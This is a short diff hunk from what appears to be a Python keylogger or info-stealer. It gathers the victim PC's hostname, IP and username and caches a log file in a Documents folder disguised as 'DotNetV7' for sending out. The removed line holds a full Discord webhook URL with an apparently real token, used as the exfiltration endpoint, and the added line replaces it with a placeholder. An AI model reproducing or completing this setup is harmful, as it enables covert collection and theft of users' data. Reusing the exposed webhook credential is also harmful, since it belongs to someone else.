@@ -9,7 +9,7 @@ IPAddr=socket.gethostbyname(hostname) # Get IP of PC (For Logging)
 user = os.getlogin()# get username of PC
 
 
-discordWebhook=str("https://discord.com/api/webhooks/1054638045351116841/5iQ_cxd03y9cdLSc5ptxXRFnA5rQOjsR5B-YoLscffhtppal7w6CUnXYnpphYQaYKy91")
+discordWebhook=str("YourWebhook")
 cache_path=str(f"C:\\Users\\{user}\\Documents\\DotNetV7") # Where to store file to send/Cache
 cache_filename=str("log.txt")
 
